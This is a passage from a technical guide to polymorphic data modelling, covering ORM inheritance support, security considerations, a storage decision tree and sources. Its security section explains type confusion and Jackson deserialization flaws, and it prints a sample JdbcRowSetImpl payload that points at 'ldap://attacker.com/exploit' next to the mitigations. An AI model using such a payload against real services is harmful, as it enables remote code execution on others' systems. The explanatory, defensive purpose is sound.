returns `CardPayment` and `BankPayment` instances directly, resolved via
the `ContentType` framework. Performance cost: one additional query per
type in the result set (uses `SELECT IN` batching).

### 7.3 Prisma (TypeScript/Node.js)

Prisma has **no native inheritance support**. The community has developed
several workarounds:

**Delegated Types (manual CTI):**

```prisma
model Payment {
  id     Int     @id @default(autoincrement())
  type   String
  amount Float
  card   CardPayment?
  bank   BankPayment?
}

model CardPayment {
  id        Int     @id @default(autoincrement())
  payment   Payment @relation(fields: [paymentId], references: [id])
  paymentId Int     @unique
  cardNumber String
}
```

This requires manual wiring and explicit includes on every query. The
ZenStack library (layered on Prisma) added polymorphic support in V2,
providing discriminated types and automatic resolution.

### 7.4 ActiveRecord (Ruby on Rails)

Rails pioneered STI in ORMs. It remains the simplest implementation:

```ruby
# Migration
create_table :payments do |t|
  t.string  :type        # Rails magic column
  t.decimal :amount
  t.string  :card_number # nullable, for CardPayment only
  t.string  :account_number
end

# Models
class Payment < ApplicationRecord; end
class CardPayment < Payment; end
class BankPayment < Payment; end

# Usage
CardPayment.create!(amount: 99, card_number: "4111...")
Payment.all  # returns mixed CardPayment and BankPayment instances
```

Rails automatically scopes queries: `CardPayment.all` generates
`SELECT * FROM payments WHERE type = 'CardPayment'`.

**Polymorphic Associations** (distinct from STI):

```ruby
class Comment < ApplicationRecord
  belongs_to :commentable, polymorphic: true
end

class Product < ApplicationRecord
  has_many :comments, as: :commentable
end

class Article < ApplicationRecord
  has_many :comments, as: :commentable
end
```

Stores `commentable_type` (class name) and `commentable_id` (FK) in the
comments table. No foreign key constraint possible at the database level.

### ORM Feature Comparison

| Feature                    | SQLAlchemy    | Django          | Prisma       | ActiveRecord |
|----------------------------|--------------|-----------------|-------------|-------------|
| STI                        | Native       | Proxy models    | Manual      | Native      |
| CTI / Joined               | Native       | Multi-table     | Manual      | Plugin      |
| Concrete                   | Native       | Abstract base   | Manual      | No          |
| Auto-downcast on query     | Yes          | django-polymorphic | No      | Yes (STI)   |
| Polymorphic eager loading  | selectin_polymorphic | select_related | include | includes |
| Discriminator column       | Configurable | ContentType     | Manual      | `type` col  |
| Generic FK                 | No (manual)  | ContentType     | No          | Polymorphic assoc |
| JSON column mapping        | `MutableDict`| `JSONField`     | `Json` type | `store`     |

---

## 8. Security Considerations

**Plain-English Summary:** Polymorphic systems introduce a category of
vulnerabilities that monomorphic systems do not face. When your application
decides which type to instantiate based on external input, an attacker has
a new attack surface: the type system itself.

### 8.1 Type Confusion Attacks

Type confusion occurs when an attacker provides data that causes the system
to instantiate the wrong type, bypassing validation or access controls that
apply only to the intended type.

```
Attack scenario:
1. API expects: { "type": "comment", "text": "hello" }
2. Attacker sends: { "type": "admin_command", "action": "delete_all" }
3. If the discriminator maps to a class with elevated privileges
   and the dispatch is not validated, the attacker escalates access.
```

**Mitigations:**
- Validate discriminator values against an explicit allowlist, never
  against a dynamic class registry
- Never use class names directly as discriminator values in external APIs
- Ensure authorization checks run AFTER type resolution, not before

### 8.2 Deserialization Vulnerabilities

The most severe class of polymorphic vulnerability. Java's Jackson library
has a long history of CVEs (CVE-2017-7525, CVE-2019-12384, CVE-2020-36180,
and others) stemming from its `@JsonTypeInfo` annotation that allows
JSON payloads to specify which Java class to instantiate.

```
Vulnerable pattern:
@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)  // <-- DANGEROUS
public abstract class Payment { ... }

Attack payload:
{
  "@class": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://attacker.com/exploit"
}
```

When `enableDefaultTyping()` is active, any class on the classpath can be
instantiated, leading to Remote Code Execution (RCE) via gadget chains.

**Mitigations (from Jackson's own security guidelines):**

1. NEVER use `enableDefaultTyping()` -- be explicit about where
   polymorphism is needed
2. Use `@JsonTypeInfo(use = Id.NAME)` with explicit `@JsonSubTypes`
   instead of `Id.CLASS` or `Id.MINIMAL_CLASS`
3. Enable `PolymorphicTypeValidator` to restrict allowed base types
4. Keep Jackson up to date -- new gadget classes are regularly discovered
   and blocklisted

**Python/Pydantic:** Less vulnerable by design. Pydantic's discriminated
unions use `Literal` values, not class names, as discriminators. There is no
mechanism for a JSON payload to specify an arbitrary Python class.

**.NET/System.Text.Json:** Uses `[JsonPolymorphic]` with a `$type`
discriminator. Requires explicit `[JsonDerivedType]` annotations for each
subtype -- no open-ended class resolution.

### 8.3 Access Control Per Subtype

Different subtypes may require different authorization rules:

```python
class Payment(ProtoModel):
    __access__ = {"read": ANYONE, "create": AUTHENTICATED}

class InternalTransfer(Payment):
    # Stricter access -- only finance team
    __access__ = {"read": ROLE("finance"), "create": ROLE("finance")}
```

**Risks:**
- If the base class access rule is checked but the subtype rule is not,
  an `InternalTransfer` becomes readable by anyone
- STI makes this worse: a single table query returns all types, and
  row-level filtering must be applied per-type
- CTI is naturally safer: subtype tables can have independent DB-level
  permissions

**Best practice:** Authorization should be resolved AFTER type discrimination,
using the concrete subtype's rules, not the base type's rules.

### Security Comparison by Storage Strategy

| Threat                     | STI Risk  | CTI Risk | Concrete Risk | JSONB Risk |
|----------------------------|----------|----------|-------------|-----------|
| Type confusion             | Medium   | Low      | Low         | Medium    |
| SQL injection via type col | Low      | N/A      | N/A         | Low       |
| Unauthorized type access   | High     | Medium   | Low         | High      |
| JSON injection             | N/A      | N/A      | N/A         | Medium    |
| Deserialization RCE        | Depends on ORM/language | Same | Same | Higher (JSON parsing) |

---

## 9. Decision Framework

Use this decision tree to select a polymorphic storage strategy:

```
Start
  |
  v
How many subtypes?
  |
  +-- 2-5 types, mostly shared fields ---------> STI
  |                                               (simple, fast reads)
  |
  +-- 5-15 types, significantly different ------> CTI
  |   fields per type                             (normalized, safe)
  |
  +-- Types queried independently, -----------> Concrete
  |   rarely across types                        (fastest per-type)
  |
  +-- Types evolve frequently, fields ----------> JSONB Hybrid
  |   change without migrations                  (flexible, good enough perf)
  |
  +-- User-defined attributes, ------------------> EAV (or JSONB)
      truly unbounded schema                      (last resort for SQL)
```

### Quick Reference: When to Pick What

| If you need...                        | Choose          |
|---------------------------------------|----------------|
| Simplest possible implementation      | STI             |
| Strongest data integrity              | CTI             |
| Fastest per-type queries              | Concrete        |
| No-migration schema flexibility       | JSONB Hybrid    |
| User-defined custom fields            | JSONB or EAV    |
| Cross-type polymorphic queries        | STI or JSONB    |
| Per-type database permissions         | CTI or Concrete |
| Compatibility with most ORMs          | STI             |

---

## 10. Sources

1. [Table Inheritance Patterns: STI vs CTI vs Concrete -- Artem Khrienov (Medium)](https://medium.com/@artemkhrenov/table-inheritance-patterns-single-table-vs-class-table-vs-concrete-table-inheritance-1aec1d978de1)
2. [SQLAlchemy 2.1: Mapping Class Inheritance Hierarchies](https://docs.sqlalchemy.org/en/21/orm/inheritance.html)
3. [OpenAPI Discriminator Usage -- Redocly](https://redocly.com/learn/openapi/discriminator)
4. [Inheritance and Polymorphism -- Swagger/OpenAPI Docs](https://swagger.io/docs/specification/v3_0/data-models/inheritance-and-polymorphism/)
5. [oneOf, allOf, anyOf: Composition and Inheritance in OpenAPI -- Speakeasy](https://www.speakeasy.com/openapi/schemas/objects/polymorphism)
6. [Polymorphism in GraphQL -- Salsify Engineering](https://www.salsify.com/blog/engineering/polymorphism-in-graphql)
7. [Rust Dispatch Explained: When Enums Beat dyn Trait -- Somethings Blog](https://www.somethingsblog.com/2025/04/20/rust-dispatch-explained-when-enums-beat-dyn-trait/)
8. [Django Polymorphic 4.10+ Documentation](https://django-polymorphic.readthedocs.io/en/stable/)
9. [Tackling Polymorphism in Prisma -- ZenStack](https://zenstack.dev/blog/polymorphism)
10. [Jackson Polymorphic Deserialization CVE Criteria -- FasterXML](https://github.com/FasterXML/jackson/wiki/Jackson-Polymorphic-Deserialization-CVE-Criteria)
11. [Pydantic Discriminated Unions Documentation](https://docs.pydantic.dev/latest/concepts/unions/)
12. [PostgreSQL JSONB: Powerful Storage for Semi-Structured Data -- Architecture Weekly](https://www.architecture-weekly.com/p/postgresql-jsonb-powerful-storage)
13. [Postgres 2025: Advanced JSON Query Optimization -- Markaicode](https://markaicode.com/postgres-json-optimization-techniques-2025/)
14. [ActiveRecord Inheritance -- Ruby on Rails API](https://api.rubyonrails.org/classes/ActiveRecord/Inheritance.html)
15. [Choosing a Database Schema for Polymorphic Data -- DoltHub](https://www.dolthub.com/blog/2024-06-25-polymorphic-associations/)
16. [The Deceptive Simplicity of Polymorphism in .NET APIs -- Gordon Beeming](https://gordonbeeming.com/blog/2025-07-17/the-deceptive-simplicity-of-polymorphism-in-net-apis)
17. [Entity-Attribute-Value Model -- Wikipedia](https://en.wikipedia.org/wiki/Entity%E2%80%93attribute%E2%80%93value_model)
18. [Prisma Table Inheritance Documentation](https://www.prisma.io/docs/orm/prisma-schema/data-model/table-inheritance)
19. [PEP 636: Structural Pattern Matching Tutorial](https://peps.python.org/pep-0636/)
20. [GraphQL Types, Interfaces, and Polymorphism -- Relay Docs](https://relay.dev/docs/tutorial/interfaces-polymorphism/)

---

*Document generated 2026-02-26. Covers PostgreSQL through v18, SQLAlchemy 2.1,
Django 5.x, Prisma 6.x, Python 3.14, TypeScript 5.x, Rust 2024 edition,
OpenAPI 3.1, and JSON Schema 2020-12.*
